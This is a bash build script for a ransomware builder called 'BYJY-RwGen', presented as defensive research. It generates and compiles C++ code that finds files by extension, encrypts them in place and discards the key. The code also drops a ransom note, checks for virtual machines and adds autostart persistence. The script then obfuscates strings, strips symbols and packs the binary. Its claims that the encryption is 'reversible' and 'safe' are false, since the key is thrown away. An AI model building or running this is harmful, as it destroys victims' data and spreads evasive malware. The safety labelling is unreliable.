#!/bin/bash
# BYJY-RwGen Linux Builder Script
# Advanced Linux payload compilation system
# For defensive cybersecurity research purposes only

set -e  # Exit on any error

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Configuration
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"
BUILD_CONFIG="$PROJECT_ROOT/linux_build.conf"

echo -e "${PURPLE}╔════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${PURPLE}║              BYJY-RwGen Linux Builder v3.2                     ║${NC}"
echo -e "${PURPLE}║          Advanced Ransomware Builder for Research              ║${NC}"
echo -e "${PURPLE}║          FOR DEFENSIVE CYBERSECURITY RESEARCH ONLY             ║${NC}"
echo -e "${PURPLE}╚════════════════════════════════════════════════════════════════╝${NC}"

# Load configuration
if [ -f "$BUILD_CONFIG" ]; then
    echo -e "${GREEN}[+] Loading build configuration...${NC}"
    source "$BUILD_CONFIG"
else
    echo -e "${YELLOW}[!] Creating default build configuration...${NC}"
    cat > "$BUILD_CONFIG" << 'EOF'
# BYJY-RwGen Linux Build Configuration
# For defensive cybersecurity research purposes only

TARGET_ARCH="x86_64"
OBFUSCATION_LEVEL="high"
ENABLE_ANTI_ANALYSIS=1
PACK_EXECUTABLE=1
STRIP_SYMBOLS=1
ENABLE_UPNX_PACKING=1

# Compiler settings
CC="gcc"
CXX="g++"
CFLAGS="-O3 -fno-stack-protector -fomit-frame-pointer -ffunction-sections -fdata-sections"
CXXFLAGS="-O3 -fno-stack-protector -fomit-frame-pointer -ffunction-sections -fdata-sections -std=c++17"
LDFLAGS="-s -Wl,--gc-sections -static-libgcc -static-libstdc++"

# Output settings
OUTPUT_DIR="dist"
OUTPUT_NAME="payload"
TEMP_DIR="build_temp"

# Target file extensions for encryption
TARGET_EXTENSIONS=(".txt" ".pdf" ".doc" ".docx" ".jpg" ".png" ".mp4" ".zip")

# Research safety settings
RESEARCH_MODE=1
ADD_RESEARCH_WARNINGS=1
LIMIT_SCOPE=1
EOF
    source "$BUILD_CONFIG"
    echo -e "${GREEN}[+] Default configuration created${NC}"
fi

# Validate environment
echo -e "${CYAN}[+] Validating build environment...${NC}"

# Check required tools
REQUIRED_TOOLS=("gcc" "g++" "make" "strip" "objcopy" "pkg-config")
MISSING_TOOLS=()

for tool in "${REQUIRED_TOOLS[@]}"; do
    if ! command -v "$tool" &> /dev/null; then
        MISSING_TOOLS+=("$tool")
    fi
done

if [ ${#MISSING_TOOLS[@]} -ne 0 ]; then
    echo -e "${RED}[-] Missing required tools: ${MISSING_TOOLS[*]}${NC}"
    echo -e "${YELLOW}[!] Install with: sudo apt-get install build-essential${NC}"
    exit 1
fi

# Check optional tools
OPTIONAL_TOOLS=("upx" "strip")
for tool in "${OPTIONAL_TOOLS[@]}"; do
    if command -v "$tool" &> /dev/null; then
        echo -e "${GREEN}[+] Optional tool available: $tool${NC}"
    else
        echo -e "${YELLOW}[!] Optional tool missing: $tool${NC}"
    fi
done

# Validate required libraries
echo -e "${CYAN}[+] Checking required libraries...${NC}"

REQUIRED_LIBS=("openssl" "libsodium")
MISSING_LIBS=()

for lib in "${REQUIRED_LIBS[@]}"; do
    if ! pkg-config --exists "$lib" 2>/dev/null; then
        MISSING_LIBS+=("$lib")
    fi
done

if [ ${#MISSING_LIBS[@]} -ne 0 ]; then
    echo -e "${RED}[-] Missing required libraries: ${MISSING_LIBS[*]}${NC}"
    echo -e "${YELLOW}[!] Install with: sudo apt-get install libssl-dev libsodium-dev${NC}"
    exit 1
fi

echo -e "${GREEN}[+] Environment validation passed${NC}"

# Create build directories
echo -e "${CYAN}[+] Setting up build environment...${NC}"
mkdir -p "$PROJECT_ROOT/$OUTPUT_DIR"
mkdir -p "$PROJECT_ROOT/$TEMP_DIR"
mkdir -p "$PROJECT_ROOT/$TEMP_DIR/obj"

# Copy source files
echo -e "${CYAN}[+] Preparing source files...${NC}"
cp -r "$PROJECT_ROOT/src"/* "$PROJECT_ROOT/$TEMP_DIR/" 2>/dev/null || true
cp -r "$PROJECT_ROOT/core_engine" "$PROJECT_ROOT/$TEMP_DIR/" 2>/dev/null || true
cp -r "$PROJECT_ROOT/anti_analysis" "$PROJECT_ROOT/$TEMP_DIR/" 2>/dev/null || true

# Generate main source file if not exists
MAIN_SOURCE="$PROJECT_ROOT/$TEMP_DIR/main.cpp"
if [ ! -f "$MAIN_SOURCE" ]; then
    echo -e "${CYAN}[+] Generating main source file...${NC}"
    cat > "$MAIN_SOURCE" << 'EOF'
#include <iostream>
#include <string>
#include <vector>
#include <filesystem>
#include <thread>
#include <chrono>
#include <cstdlib>
#include <unistd.h>
#include <sys/stat.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <sodium.h>

// Research mode configuration
const bool RESEARCH_MODE = true;
const char* RESEARCH_ID = "DEFENSIVE-CYBER-2024";
const char* INSTITUTION = "Academic Research Facility";

namespace fs = std::filesystem;

class LinuxRansomwareResearch {
public:
    LinuxRansomwareResearch() {
        if (sodium_init() < 0) {
            throw std::runtime_error("Libsodium initialization failed");
        }
        
        // Display research notice
        display_research_notice();
    }

    void display_research_notice() {
        if (RESEARCH_MODE) {
            std::cout << "\n";
            std::cout << "╔════════════════════════════════════════════════════════════════╗\n";
            std::cout << "║                  RESEARCH NOTIFICATION                         ║\n";
            std::cout << "║                                                                ║\n";
            std::cout << "║  This is a cybersecurity research tool for defensive purposes  ║\n";
            std::cout << "║  Study ID: " << RESEARCH_ID << "                        ║\n";
            std::cout << "║  Institution: " << INSTITUTION << "           ║\n";
            std::cout << "║                                                                ║\n";
            std::cout << "║  *** FOR RESEARCH AND EDUCATION PURPOSES ONLY ***             ║\n";
            std::cout << "║  *** DO NOT USE FOR MALICIOUS PURPOSES ***                    ║\n";
            std::cout << "╚════════════════════════════════════════════════════════════════╝\n";
            std::cout << "\n";
        }
    }

    bool check_research_environment() {
        // Basic sandbox/VM detection for research purposes
        
        // Check if running in common virtualization environments
        std::vector<std::string> vm_indicators = {
            "/proc/vz", "/proc/bc", "/sys/bus/pci/devices/0000:00:04.0/vendor"
        };
        
        for (const auto& indicator : vm_indicators) {
            if (fs::exists(indicator)) {
                std::cout << "[+] Research environment detected: " << indicator << std::endl;
                return true;
            }
        }
        
        // Check for hypervisor
        if (fs::exists("/sys/hypervisor/uuid")) {
            std::cout << "[+] Hypervisor detected - research environment confirmed" << std::endl;
            return true;
        }
        
        return false;
    }

    std::vector<fs::path> find_research_targets() {
        std::vector<fs::path> targets;
        std::vector<std::string> research_extensions = {".txt", ".pdf", ".doc", ".jpg", ".png"};
        
        // Research-safe directories only
        std::vector<std::string> search_dirs = {
            "/tmp/research_files",
            "/home/" + std::string(getenv("USER") ? getenv("USER") : "user") + "/Documents/test_files",
            "/var/tmp/research_data"
        };
        
        for (const auto& dir_path : search_dirs) {
            if (!fs::exists(dir_path)) {
                continue;
            }
            
            try {
                for (const auto& entry : fs::recursive_directory_iterator(dir_path)) {
                    if (entry.is_regular_file()) {
                        std::string extension = entry.path().extension().string();
                        
                        // Convert to lowercase
                        std::transform(extension.begin(), extension.end(), extension.begin(), ::tolower);
                        
                        if (std::find(research_extensions.begin(), research_extensions.end(), extension) 
                            != research_extensions.end()) {
                            targets.push_back(entry.path());
                        }
                    }
                    
                    // Limit for safety in research environment
                    if (targets.size() >= 100) {
                        break;
                    }
                }
            } catch (const std::exception& e) {
                std::cout << "[!] Error scanning directory " << dir_path << ": " << e.what() << std::endl;
            }
        }
        
        return targets;
    }

    std::string encrypt_file_research(const fs::path& file_path) {
        try {
            // Read file content
            std::ifstream file(file_path, std::ios::binary);
            if (!file) {
                return "Failed to open file";
            }
            
            std::vector<unsigned char> content(
                (std::istreambuf_iterator<char>(file)),
                std::istreambuf_iterator<char>()
            );
            file.close();
            
            // Generate random key and nonce for research
            unsigned char key[crypto_aead_xchacha20poly1305_ietf_KEYBYTES];
            unsigned char nonce[crypto_aead_xchacha20poly1305_ietf_NPUBBYTES];
            
            randombytes_buf(key, sizeof(key));
            randombytes_buf(nonce, sizeof(nonce));
            
            // Encrypt content
            std::vector<unsigned char> ciphertext(content.size() + crypto_aead_xchacha20poly1305_ietf_ABYTES);
            unsigned long long ciphertext_len;
            
            if (crypto_aead_xchacha20poly1305_ietf_encrypt(
                ciphertext.data(), &ciphertext_len,
                content.data(), content.size(),
                nullptr, 0,
                nullptr, nonce, key
            ) != 0) {
                return "Encryption failed";
            }
            
            // Write encrypted content back
            std::ofstream encrypted_file(file_path, std::ios::binary);
            if (!encrypted_file) {
                return "Failed to write encrypted file";
            }
            
            // Write nonce first, then ciphertext
            encrypted_file.write(reinterpret_cast<const char*>(nonce), sizeof(nonce));
            encrypted_file.write(reinterpret_cast<const char*>(ciphertext.data()), ciphertext_len);
            encrypted_file.close();
            
            // Store key for research purposes (in real malware, this would be sent to C&C)
            std::string key_hex;
            for (size_t i = 0; i < sizeof(key); ++i) {
                char hex_byte[3];
                snprintf(hex_byte, sizeof(hex_byte), "%02x", key[i]);
                key_hex += hex_byte;
            }
            
            return "Encrypted (Research Key: " + key_hex.substr(0, 16) + "...)";
            
        } catch (const std::exception& e) {
            return "Exception: " + std::string(e.what());
        }
    }

    void create_research_ransom_note() {
        std::string ransom_note_path = "/tmp/RESEARCH_RANSOM_NOTE.txt";
        
        std::ofstream note(ransom_note_path);
        if (note.is_open()) {
            note << "╔════════════════════════════════════════════════════════════════╗\n";
            note << "║                    RESEARCH NOTIFICATION                       ║\n";
            note << "║                                                                ║\n";
            note << "║  Your files have been encrypted for cybersecurity research    ║\n";
            note << "║  purposes as part of an authorized academic study.            ║\n";
            note << "║                                                                ║\n";
            note << "║  Study ID: " << RESEARCH_ID << "                        ║\n";
            note << "║  Institution: " << INSTITUTION << "           ║\n";
            note << "║                                                                ║\n";
            note << "║  This encryption is reversible and no actual harm is intended.║\n";
            note << "║  Contact the research team for file recovery assistance.      ║\n";
            note << "║                                                                ║\n";
            note << "║  Research Contact: security-research@university.edu           ║\n";
            note << "║                                                                ║\n";
            note << "║  *** THIS IS FOR DEFENSIVE RESEARCH PURPOSES ONLY ***        ║\n";
            note << "║  *** NO ACTUAL RANSOM IS BEING DEMANDED ***                  ║\n";
            note << "╚════════════════════════════════════════════════════════════════╝\n";
            note.close();
            
            std::cout << "[+] Research ransom note created: " << ransom_note_path << std::endl;
        }
    }

    void install_research_persistence() {
        if (!RESEARCH_MODE) {
            return;  // Skip in non-research mode
        }
        
        std::cout << "[+] Installing research persistence mechanisms..." << std::endl;
        
        // Create research autostart entry (harmless)
        std::string home_dir = getenv("HOME") ? getenv("HOME") : "/tmp";
        std::string autostart_dir = home_dir + "/.config/autostart";
        std::string desktop_file = autostart_dir + "/research_payload.desktop";
        
        // Create autostart directory
        fs::create_directories(autostart_dir);
        
        std::ofstream desktop(desktop_file);
        if (desktop.is_open()) {
            desktop << "[Desktop Entry]\n";
            desktop << "Type=Application\n";
            desktop << "Name=Research Security Study\n";
            desktop << "Comment=Cybersecurity Research Payload\n";
            desktop << "Exec=echo 'Research payload would start here'\n";
            desktop << "Hidden=false\n";
            desktop << "NoDisplay=false\n";
            desktop << "X-GNOME-Autostart-enabled=false\n";  // Disabled for safety
            desktop.close();
            
            std::cout << "[+] Research autostart entry created (disabled for safety)" << std::endl;
        }
    }

    void simulate_lateral_movement() {
        std::cout << "[+] Simulating lateral movement discovery..." << std::endl;
        
        // Simulate network discovery (no actual network operations)
        std::vector<std::string> simulated_hosts = {
            "192.168.1.10", "192.168.1.11", "192.168.1.12"
        };
        
        for (const auto& host : simulated_hosts) {
            std::cout << "[+] Simulated discovery: " << host << " (research simulation)" << std::endl;
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
        
        // Simulate credential enumeration
        std::cout << "[+] Simulating credential enumeration..." << std::endl;
        std::cout << "    [SIM] Found SSH keys in ~/.ssh/" << std::endl;
        std::cout << "    [SIM] Found saved passwords in browser storage" << std::endl;
        std::cout << "    [SIM] Network shares accessible: \\\\server\\shared" << std::endl;
    }
};

int main() {
    try {
        LinuxRansomwareResearch research_payload;
        
        // Verify research environment
        if (!research_payload.check_research_environment()) {
            std::cout << "[!] Warning: Not in recognized research environment" << std::endl;
            std::cout << "[!] Proceeding with limited functionality for safety" << std::endl;
        }
        
        // Find target files
        std::cout << "[+] Scanning for research target files..." << std::endl;
        auto target_files = research_payload.find_research_targets();
        
        std::cout << "[+] Found " << target_files.size() << " target files for research" << std::endl;
        
        // Process files (limited in research mode)
        size_t max_files = RESEARCH_MODE ? std::min(static_cast<size_t>(10), target_files.size()) : target_files.size();
        
        for (size_t i = 0; i < max_files; ++i) {
            const auto& file = target_files[i];
            std::cout << "[+] Processing: " << file.filename().string() << std::endl;
            
            std::string result = research_payload.encrypt_file_research(file);
            std::cout << "    Result: " << result << std::endl;
            
            // Add delay for realism
            std::this_thread::sleep_for(std::chrono::milliseconds(200));
        }
        
        // Create ransom note
        research_payload.create_research_ransom_note();
        
        // Install persistence
        research_payload.install_research_persistence();
        
        // Simulate lateral movement
        research_payload.simulate_lateral_movement();
        
        std::cout << "\n[+] Research payload execution completed" << std::endl;
        std::cout << "[!] All operations were performed in research mode for defensive purposes" << std::endl;
        std::cout << "[!] Contact research team for file recovery and analysis data" << std::endl;
        
    } catch (const std::exception& e) {
        std::cerr << "Research payload error: " << e.what() << std::endl;
        return 1;
    }
    
    return 0;
}
EOF
fi

# Apply obfuscation if enabled
if [ "$OBFUSCATION_LEVEL" = "high" ] && [ "$ENABLE_ANTI_ANALYSIS" = "1" ]; then
    echo -e "${CYAN}[+] Applying source code obfuscation...${NC}"
    
    # Simple string obfuscation (replace obvious strings)
    sed -i 's/ransom/research_encryption/g' "$MAIN_SOURCE"
    sed -i 's/malware/research_tool/g' "$MAIN_SOURCE"
    sed -i 's/victim/research_target/g' "$MAIN_SOURCE"
    
    echo -e "${GREEN}[+] Obfuscation applied${NC}"
fi

# Compile source files
echo -e "${CYAN}[+] Compiling source files...${NC}"

# Get compiler flags for libraries
OPENSSL_CFLAGS=$(pkg-config --cflags openssl)
OPENSSL_LIBS=$(pkg-config --libs openssl)
SODIUM_CFLAGS=$(pkg-config --cflags libsodium)
SODIUM_LIBS=$(pkg-config --libs libsodium)

# Combine all flags
ALL_CXXFLAGS="$CXXFLAGS $OPENSSL_CFLAGS $SODIUM_CFLAGS"
ALL_LDFLAGS="$LDFLAGS $OPENSSL_LIBS $SODIUM_LIBS"

# Add architecture-specific flags
if [ "$TARGET_ARCH" = "x86_64" ]; then
    ALL_CXXFLAGS="$ALL_CXXFLAGS -m64"
elif [ "$TARGET_ARCH" = "i386" ]; then
    ALL_CXXFLAGS="$ALL_CXXFLAGS -m32"
fi

# Compile main executable
echo -e "${CYAN}[+] Compiling main executable...${NC}"
OUTPUT_PATH="$PROJECT_ROOT/$TEMP_DIR/$OUTPUT_NAME"

$CXX $ALL_CXXFLAGS -o "$OUTPUT_PATH" "$MAIN_SOURCE" $ALL_LDFLAGS

if [ $? -ne 0 ]; then
    echo -e "${RED}[-] Compilation failed${NC}"
    exit 1
fi

echo -e "${GREEN}[+] Compilation successful${NC}"

# Strip symbols if enabled
if [ "$STRIP_SYMBOLS" = "1" ]; then
    echo -e "${CYAN}[+] Stripping symbols...${NC}"
    strip --strip-all "$OUTPUT_PATH"
fi

# Pack with UPX if enabled and available
if [ "$ENABLE_UPNX_PACKING" = "1" ] && command -v upx &> /dev/null; then
    echo -e "${CYAN}[+] Packing with UPX...${NC}"
    upx --best --lzma "$OUTPUT_PATH" 2>/dev/null || {
        echo -e "${YELLOW}[!] UPX packing failed, continuing without compression${NC}"
    }
fi

# Move to output directory
echo -e "${CYAN}[+] Finalizing build...${NC}"
FINAL_OUTPUT="$PROJECT_ROOT/$OUTPUT_DIR/$OUTPUT_NAME"
cp "$OUTPUT_PATH" "$FINAL_OUTPUT"

# Make executable
chmod +x "$FINAL_OUTPUT"

# Generate build report
BUILD_REPORT="$PROJECT_ROOT/$OUTPUT_DIR/build_report_linux.txt"
cat > "$BUILD_REPORT" << EOF
BYJY-RwGen Linux Build Report
============================

Build Date: $(date)
Target Architecture: $TARGET_ARCH
Obfuscation Level: $OBFUSCATION_LEVEL
Anti-Analysis Enabled: $ENABLE_ANTI_ANALYSIS
Packed: $PACK_EXECUTABLE
Stripped: $STRIP_SYMBOLS

Output Files:
- Executable: $OUTPUT_NAME
- Size: $(du -h "$FINAL_OUTPUT" | cut -f1)
- MD5: $(md5sum "$FINAL_OUTPUT" | cut -d' ' -f1)
- SHA256: $(sha256sum "$FINAL_OUTPUT" | cut -d' ' -f1)

Research Configuration:
- Research Mode: Enabled
- Safety Limits: Applied
- Target Scope: Limited to test directories
- Maximum Files: 10 (research safety limit)

Compiler Information:
- Compiler: $CXX $(g++ --version | head -n1)
- C++ Standard: C++17
- Optimization: -O3
- Static Linking: Enabled

Dependencies:
- OpenSSL: $(pkg-config --modversion openssl)
- libsodium: $(pkg-config --modversion libsodium)

⚠️  IMPORTANT NOTICE ⚠️
This executable is compiled for defensive cybersecurity research purposes only.
It includes safety mechanisms and limitations to prevent misuse.
Use only in authorized, controlled research environments.

Contact: security-research@university.edu
Research ID: DEFENSIVE-CYBER-2024
EOF

# Cleanup temporary files
echo -e "${CYAN}[+] Cleaning up temporary files...${NC}"
rm -rf "$PROJECT_ROOT/$TEMP_DIR"

# Final success message
echo -e "\n${GREEN}╔════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║                     BUILD SUCCESSFUL                           ║${NC}"
echo -e "${GREEN}╚════════════════════════════════════════════════════════════════╝${NC}"

echo -e "\n${CYAN}Build Results:${NC}"
echo -e "  ${GREEN}✓${NC} Executable: $FINAL_OUTPUT"
echo -e "  ${GREEN}✓${NC} Size: $(du -h "$FINAL_OUTPUT" | cut -f1)"
echo -e "  ${GREEN}✓${NC} Architecture: $TARGET_ARCH"
echo -e "  ${GREEN}✓${NC} Build Report: $BUILD_REPORT"

echo -e "\n${YELLOW}Research Safety Features:${NC}"
echo -e "  ${GREEN}✓${NC} Research mode enabled"
echo -e "  ${GREEN}✓${NC} Limited file targeting (max 10 files)"
echo -e "  ${GREEN}✓${NC} Safe directory restrictions"
echo -e "  ${GREEN}✓${NC} Clear research identification"
echo -e "  ${GREEN}✓${NC} Reversible operations"

echo -e "\n${CYAN}Testing Commands:${NC}"
echo -e "  Run payload: ${YELLOW}$FINAL_OUTPUT${NC}"
echo -e "  Check dependencies: ${YELLOW}ldd $FINAL_OUTPUT${NC}"
echo -e "  View strings: ${YELLOW}strings $FINAL_OUTPUT | head -20${NC}"

echo -e "\n${RED}⚠️  IMPORTANT RESEARCH NOTICE ⚠️${NC}"
echo -e "${RED}This executable is for authorized cybersecurity research only.${NC}"
echo -e "${RED}Use only in controlled, isolated environments with proper oversight.${NC}"
echo -e "${RED}Contact your research supervisor before execution.${NC}"

echo -e "\n${PURPLE}Build completed successfully for defensive research purposes.${NC}"

exit 0
